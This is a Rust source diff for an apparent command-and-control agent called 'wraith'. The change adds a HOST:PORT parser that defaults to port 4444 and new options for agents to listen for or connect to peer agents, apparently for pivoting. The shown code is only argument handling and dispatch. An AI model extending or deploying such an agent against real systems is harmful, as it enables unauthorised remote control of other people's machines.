@@ -10,10 +10,17 @@ mod relay;
 mod wraith;
 
 use clap::Parser;
-use crate::wraith::Config;
-use crate::connection::TcpConnection;
 use log::{error, info};
 use std::net::Ipv4Addr;
+
+fn parse_host_port(addr: &str) -> (String, u16) {
+    let parts: Vec<&str> = addr.split(':').collect();
+    if parts.len() == 2 {
+        (parts[0].to_string(), parts[1].parse().unwrap_or(4444))
+    } else {
+        (addr.to_string(), 4444)
+    }
+}
 
 #[derive(Parser)]
 #[command(name = "wraith")]
@@ -38,6 +45,14 @@ struct Args {
     /// Listen mode (server)
     #[arg(short = 'l', long)]
     listen: bool,
+
+    /// Agent mode: listen for peer wraith connections (format: HOST:PORT)
+    #[arg(long, value_name = "HOST:PORT")]
+    agent_listen: Option<String>,
+
+    /// Agent mode: connect to peer wraith (format: HOST:PORT)
+    #[arg(long, value_name = "HOST:PORT")]
+    agent_connect: Option<String>,
 }
 
 fn setup_logging(debug: bool, log_file: &Option<String>) -> Result<(), Box<dyn std::error::Error>> {
@@ -75,6 +90,25 @@ fn main() {
     let args = Args::parse();
 
     setup_logging(args.debug, &args.log_file).unwrap();
+
+    // Handle agent mode
+    if let Some(addr) = &args.agent_listen {
+        let (host, port) = parse_host_port(addr);
+        info!("Agent mode: listening for peers on {}:{}", host, port);
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let mut wraith = wraith::Wraith::new_agent_listener(host, port);
+        rt.block_on(wraith.run_agent_listener());
+        return;
+    }
+
+    if let Some(addr) = &args.agent_connect {
+        let (host, port) = parse_host_port(addr);
+        info!("Agent mode: connecting to peer at {}:{}", host, port);
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let mut wraith = wraith::Wraith::new_agent_connect(host, port);
+        rt.block_on(wraith.run_agent_connect());
+        return;
+    }
 
     let host = args.c2_host.to_string();
     let port = args.c2_port;
